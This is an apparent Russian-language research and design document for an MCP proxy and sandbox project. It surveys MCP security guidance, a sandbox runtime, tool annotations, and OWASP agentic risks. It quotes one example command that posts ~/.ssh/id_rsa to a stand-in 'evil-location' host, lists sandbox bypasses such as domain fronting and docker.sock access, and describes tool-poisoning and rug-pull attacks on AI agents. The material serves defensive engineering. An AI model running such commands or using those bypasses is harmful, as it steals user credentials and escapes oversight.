# 04 — Разведка индустрии

Проведена 2026-08-27. Цель — понять, что уже существует, какие стандарты сложились,
и что из этого меняет наш план.

## TL;DR — пять вещей, изменивших план

1. **Наша архитектура shim→daemon описана в спеке MCP как отдельный вектор атаки.**
2. **`anthropic-experimental/sandbox-runtime` покрывает почти весь E3** — не пишем свои SBPL.
3. **Сеть — доменный allowlist через прокси**, а не бинарный `deny`.
4. **Риск-тиры не изобретаем** — в спеке MCP есть готовые tool annotations.
5. **Наша идея уже реализована как минимум дважды** — новизну надо переформулировать.

---

## 1. Спека MCP описала атаку на нашу архитектуру

Документ [Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
содержит раздел **«stdio Transport Security in Proxy Scenarios»**, буквально про прокси,
который спавнит MCP-серверы как дочерние процессы:

> 1. Атакующий добивается XSS или иного исполнения кода на стороне клиента
> 2. Получает токен аутентификации MCP-прокси из окружения клиента
> 3. Делает аутентифицированные запросы к локальному прокси
> 4. Прокси спавнит произвольные команды через stdio, считая их легитимными серверами
> 5. RCE с правами пользователя

Рекомендации спеки, которые мы принимаем: sandboxing спавнящихся процессов,
ограничение ФС, логирование всего stdio-трафика, отдельная авторизация опасных команд,
изоляция коммуникации с прокси в отдельном контексте безопасности.

**Наше усиление сверх спеки:** демон принимает только `{recipe, params}`, никогда argv.
Полный контроль над сокетом даёт максимум вызов существующего рецепта — не RCE.

Там же раздел **«Local MCP Server Compromise»** с примером ровно нашего сценария:

```bash
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
```

и требованием MUST показывать точную команду без усечения перед исполнением.

## 2. `@anthropic-ai/sandbox-runtime` (srt)

[github.com/anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime).
То, на чём работает нативный сандбокс Claude Code. Research preview, открытый исходник.

### Что там уже есть

- Генерация seatbelt-профилей из JSON (macOS), bubblewrap (Linux), WFP + отдельный
  пользователь `srt-sandbox` (Windows, alpha)
- **HTTP + SOCKS5 прокси на хосте** для доменной фильтрации — чего у нас в плане не было
- Асимметричная модель прав: чтение deny-then-allow, запись allow-only
- **Mandatory deny paths**, неснимаемые даже явным allow: `.bashrc`, `.zshrc`, `.profile`,
  `.gitconfig`, `.git/hooks/`, `.vscode/`, `.idea/`, `.claude/commands/`
- **`sandbox-violation-store`** — читает системный лог нарушений песочницы macOS
  и отдаёт программно
- Java-агент `srt-proxy-agent.jar`, потому что JVM игнорирует прокси из env

### API

```ts
import { SandboxManager, type SandboxRuntimeConfig } from '@anthropic-ai/sandbox-runtime'

await SandboxManager.initialize(config)
const wrapped = await SandboxManager.wrapWithSandbox('pnpm test')
const violations = SandboxManager.getViolationsForCommand(commandId)
const annotated  = SandboxManager.annotateStderrWithSandboxFailures(commandId, stderr)
```

### Формат конфига

```json
{
  "network": {
    "allowedDomains": ["registry.npmjs.org", "*.github.com"],
    "deniedDomains": [],
    "allowUnixSockets": []
  },
  "filesystem": {
    "denyRead":  ["~/.ssh", "~/.aws"],
    "allowRead": ["."],
    "allowWrite": ["coverage", "node_modules/.cache", "/tmp"],
    "denyWrite": [".env", "secrets/"]
  },
  "ignoreViolations": { "*": ["/usr/bin", "/System"] }
}
```

macOS поддерживает git-style globs (`*`, `**`, `?`, `[abc]`); Linux — только литеральные пути.

### Почему это подарок для нашего UI

`getViolationsForCommand` даёт **структурированный поток «что процесс пытался сделать
и получил отказ»**. Это готовый контент для таймлайна Electron — не надо придумывать
формат, он уже есть. Мониторинг живьём:

```bash
log stream --predicate 'process == "sandbox-exec"' --style syslog
```

### Задекларированные ограничения

Их надо знать и честно показывать на демо:

- фильтрация **только по доменам**, содержимое не инспектируется → domain fronting обходит
- широкий allowlist убивает смысл: разрешил `github.com` → можно запушить данные в свой репо
- `allowUnixSockets: ["/var/run/docker.sock"]` = полный доступ к хосту
- `enableWeakerNetworkIsolation` (нужен для Go TLS) открывает эксфильтрацию через `trustd`
- `allowAppleEvents` «removes code-execution isolation» — запущенные через `open`/`osascript`
  приложения работают вне песочницы
- запись в разрешённой директории в файл, который потом исполнится, — обход
- на Linux bubblewrap может блокировать только **существующие** файлы

**Эффект на план:** E3 превращается из «написать и отладить SBPL-профили» в
«смаппить манифест в конфиг srt + прокинуть violations в шину событий». Примерно втрое дешевле.

## 3. Сеть: доменный allowlist, а не бинарный deny

Исходно планировался `network: none`. Неверно: половина легитимных задач требует сети
(`npm ci` идёт в registry), жёсткий deny генерирует гору false blocks — а это метрика,
по которой нас судят.

[ToolHive (Stacklok)](https://github.com/stacklok/toolhive) поднимает вокруг MCP-сервера
egress-прокси + контейнер DNS + ingress-прокси; трафик разрешён только к хостам из
permission profile. srt делает то же прокси на хосте. Индустрия сошлась на одном паттерне.

**Бонус:** прокси видит каждую попытку соединения, включая заблокированные. В UI
показываем не «сеть запрещена», а «процесс стучался на `evil.io:443`, отказано, 1.2 KB».

## 4. Tool annotations — готовый словарь рисков

[MCP-блог](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
прямо называет их «risk vocabulary for agentic systems».

| Аннотация | Смысл | Дефолт |
|---|---|---|
| `readOnlyHint` | не меняет окружение | `false` |
| `destructiveHint` | может удалять/перезаписывать (значим только при `readOnlyHint: false`) | **`true`** |
| `idempotentHint` | повтор с теми же аргументами безвреден | `false` |
| `openWorldHint` | ходит во внешний мир | `true` |

**Дефолты пессимистичные.** Инструмент без аннотаций считается разрушительным,
неидемпотентным и открытым во внешний мир. Идеально ложится на нашу модель:
рецепт без явного объявления получает максимальный риск-тир автоматически — fail-safe
by construction. Не изобретаем свои `risk: low|high`, а эмитим стандартные аннотации
в `tools/list` (совместимость с любым MCP-клиентом) и маппим в тиры внутри.

## 5. Elicitation — штатные подтверждения, которым нельзя доверять

В спеке 2025-06-18 появился [elicitation](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements):
сервер шлёт `elicitation/create` с сообщением и JSON-схемой, клиент показывает пользователю.
Pinterest, по публикациям, гоняет через это все чувствительные MCP-операции.

**Но для нас это не может быть authoritative-путём.** Elicitation идёт через клиент
и модель — то есть подтверждение живёт в том же канале, который мы считаем
скомпрометированным. Это OWASP ASI09 в чистом виде.

Двухканальная схема: elicitation — мягкий путь для low/medium; Electron-модалка —
out-of-band, единственный authoritative канал для high-risk. См. [ADR-0005](adr/0005-dual-channel-approvals.md).

## 6. Rug pull — это CVE, а не гипотеза

[Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
описали три класса, у которых общая структурная причина — **MCP-клиенты наследуют доверие
к серверам без непрерывной верификации**:

- **Tool poisoning / line jumping** — скрытые инструкции в описании инструмента влияют
  на клиента без ведома пользователя. Первый публичный PoC — апрель 2025. Термины и
  классификация принадлежат **Invariant Labs**, а не спецификации MCP: в спеке их нет, и
  ссылаться на неё как на источник этих названий неверно.
- **Rug pull** — сервер меняет описание инструмента **после** одобрения пользователем.
  По публикациям, **CVE-2025-54136** (CVSS 8.8) подтвердила, что одобрение определения
  инструмента не переживает изменение на стороне сервера.
- **Tool shadowing** — злонамеренный сервер подменяет поведение доверенного инструмента.

Академические замеры на 45+ реальных MCP-серверах: attack success rate > 60%,
у лучшей модели 72.8%.

**Перевод на нас:** `mcpproxy.yaml` лежит в репозитории и может быть изменён кем угодно —
включая саму модель через другой инструмент или контрибьютора через PR. Одобрил рецепт
вчера — сегодня он делает другое. Значит lock-файл обязателен ([ADR-0006](adr/0006-manifest-lockfile.md)).

**Зеркальный нюанс:** мы сами генерируем описания инструментов из манифеста, поэтому
к poisoning от чужого сервера неуязвимы — зато **манифест становится каналом инъекции
в нашу же модель**. Санитизация `description` при генерации `tools/list` обязательна.

Есть [`mcp-scan`](https://invariantlabs.ai/blog/introducing-mcp-scan) — статический
сканер описаний на injection-паттерны и cross-origin эскалации, плюс режим прокси
с runtime-guardrails (YAML, иерархически скоупится по client/server/tool).
Можно прогнать по нашему собственному выводу: «нас проверил независимый сканер».

## 7. Схема событий — берём OpenTelemetry

[GenAI semantic conventions](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions):
дерево спанов `invoke_agent` → `chat` / `execute_tool`, атрибут `gen_ai.operation.name`
(`create_agent`, `invoke_agent`, `invoke_workflow`, `execute_tool`, `retrieval`, `plan`,
memory-операции). `execute_tool` — всегда span kind INTERNAL.

**Направление переезда было записано неверно и исправлено разведкой 2026-08-27.** Реестр
`model/mcp/registry.yaml` проверен на каждом теге основного репозитория конвенций: его нет до
v1.39.0, он присутствует на v1.39.0–v1.41.x и **отсутствует начиная с v1.42.0**. Релизная
заметка v1.42.0 говорит, что всё `gen_ai.*` и `model/mcp/` **ушло** из основного репозитория
в отдельный `open-telemetry/semantic-conventions-genai`. То есть конвенции MCP не приехали в
общий словарь, а выехали из него.

**Каких атрибутов не существует.** В реестре MCP их всего четыре: `mcp.method.name`,
`mcp.session.id`, `mcp.resource.uri`, `mcp.protocol.version`. Имя инструмента переиспользует
`gen_ai.tool.name`, идентификатор запроса — `jsonrpc.request.id`, транспорт —
`network.transport`. Названные ранее `mcp.tool.name`, `mcp.request.id` и `mcp.transport`
не существуют вовсе.

Статус на середину июля 2026 — все `gen_ai.*` помечены «Development», не Stable.
Новый репозиторий не имеет ни одного тега и ни одного релиза, то есть закрепиться можно
только на коммит, и дрейф уже наблюдался: `gen_ai.agent.name` появился на спане
`execute_tool` после v1.41.0 без релиза. Это и есть довод за **свой шейп плюс экспортёр**,
а не за нативную схему.

**Выгода:** бесплатный экспорт в любой observability-стек и аргумент «встраивается
в существующий контур». Стоимость — ноль, если заложить в E0; переделка потом — дорого.
См. [ADR-0003](adr/0003-otel-event-schema.md).

## 8. Метрики и корпуса атак — есть методология

- **InjecAgent** — первый бенчмарк специально под indirect prompt injection для
  tool-integrated агентов: 1054 кейса, 17 пользовательских и 62 атакующих инструмента.
- **AgentDojo** — 97 практических задач, 629 security-кейсов, симулированная среда
  с многошаговым взаимодействием и end-to-end оценкой.

Закрепившаяся пара метрик:

- **ASR** (Attack Success Rate) — доля успешных атак
- **Utility under Attack** — способность выполнять легитимные задачи под атакой

Вторая метрика ловит ровно тот провал, который у нас в критерии фальсификации
(«чрезмерно блокирует безопасные действия»). Показывать надо обе, всегда рядом.

Сами корпуса нам не подходят (email-клиенты, банкинг) — берём методологию и терминологию,
корпус пишем свой, CLI-специфичный. См. [09-metrics-and-eval.md](09-metrics-and-eval.md).

## 9. OWASP Top 10 for Agentic Applications 2026

Опубликован 9 декабря 2025, категории ASI01–ASI10. Полная таблица с нашим покрытием —
в [03-threat-model.md](03-threat-model.md).

| ID | Риск | Основная защита по OWASP |
|---|---|---|
| ASI01 | Agent Goal Hijack | Считать полученный контент недоверенным; ограничивать цели |
| ASI02 | Tool Misuse & Exploitation | Least-agency scoping; валидация параметров |
| ASI03 | Identity & Privilege Abuse | Идентичность на агента; короткоживущие scoped-креды |
| ASI04 | Agentic Supply Chain | Подписанные компоненты; AIBOM и провенанс |
| ASI05 | Unexpected Code Execution | Песочница; deny-by-default egress |
| ASI06 | Memory & Context Poisoning | Валидируемая запись в память; эфемерный контекст |
| ASI07 | Insecure Inter-Agent Comms | Взаимная аутентификация; подписанные сообщения |
| ASI08 | Cascading Failures | Изоляция blast radius; circuit breakers |
| ASI09 | Human-Agent Trust Exploitation | Принудительное подтверждение чувствительных действий |
| ASI10 | Rogue Agents | Поведенческий мониторинг; kill switch |

## 10. Мелочи, которые забираем

- **Docker MCP Gateway** делает [interceptors](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/):
  `--block-secrets` сканирует **inbound и outbound** payload'ы; `--verify-signatures`
  проверяет провенанс образа; `--log-calls`. Двусторонний скан — правильно.
- **Секретные паттерны не пишем сами.** У gitleaks 150+ правил (AWS, GitHub, Slack webhooks,
  строки подключения к БД, приватные ключи) плюс энтропийный анализ поверх regex.
  Есть [Secrets-Patterns-DB](https://mazinahmed.net/blog/secrets-patterns-db/) в
  унифицированном формате с конвертацией под gitleaks/trufflehog.
  TruffleHog считает Shannon-энтропию для base64 и hex наборов на блоках > 20 символов.
- **Аудит:** hash-chain достаточно; индустриальный best practice — Merkle + consistency
  proofs в стиле Certificate Transparency (лог из 80 млн событий → 3 KB доказательства).
- **Cedar** — AWS вшил его в Bedrock AgentCore Policy в марте 2026 именно для интерсепта
  agent-tool вызовов: default-deny, forbid-wins-over-permit, порядко-независимая оценка,
  формально верифицированная семантика. Для соло-демо избыточно; упомянуть «policy-слой
  выносится в Cedar» — плюс к серьёзности.
- **Electron:** [`contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`,
  `webSecurity: true`, жёсткий CSP](https://www.electronjs.org/docs/latest/tutorial/security).
  IPC — граница безопасности, каждое сообщение из renderer валидировать как недоверенный
  HTTP-запрос. Отдельно — V8 patch gap: при `sandbox: true` эксплойты V8 остаются
  внутри renderer'а.
- **CaMeL / dual-LLM** ([arXiv:2503.18813](https://arxiv.org/pdf/2503.18813)) —
  теоретическая рамка: control flow извлекается из доверенного запроса, недоверенные
  данные на него не влияют; каждому значению приписывается capability-метаданные,
  кастомный интерпретатор следит за провенансом. 67% отражённых атак на AgentDojo.
  Наш рецепт = capability в их терминах.

## Источники

- [MCP Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
- [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- [Tool Annotations as Risk Vocabulary — MCP Blog](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) ·
  [разбор Palo Alto](https://www.paloaltonetworks.com/blog/cloud-security/owasp-agentic-ai-security/) ·
  [разбор Cycode](https://cycode.com/blog/owasp-top-10-agentic-applications/)
- [Invariant Labs — Tool Poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) ·
  [MCP-Scan](https://invariantlabs.ai/blog/introducing-mcp-scan)
- [ToolHive](https://github.com/stacklok/toolhive) · [Network isolation](https://docs.stacklok.com/toolhive/guides-cli/network-isolation)
- [Docker MCP Gateway](https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/)
- [OTel GenAI semantic conventions](https://greptime.com/blogs/2026-05-09-opentelemetry-genai-semantic-conventions)
- [MCP Elicitation (Cisco)](https://blogs.cisco.com/developer/whats-new-in-mcp-elicitation-structured-content-and-oauth-enhancements)
- [AgentDojo / AgentDyn](https://arxiv.org/html/2602.03117v1)
- [Defeating Prompt Injections by Design (CaMeL)](https://arxiv.org/pdf/2503.18813)
- [tumf/mcp-shell-server](https://github.com/tumf/mcp-shell-server)
- [Electron Security](https://www.electronjs.org/docs/latest/tutorial/security)
- [Secrets Patterns DB](https://mazinahmed.net/blog/secrets-patterns-db/)
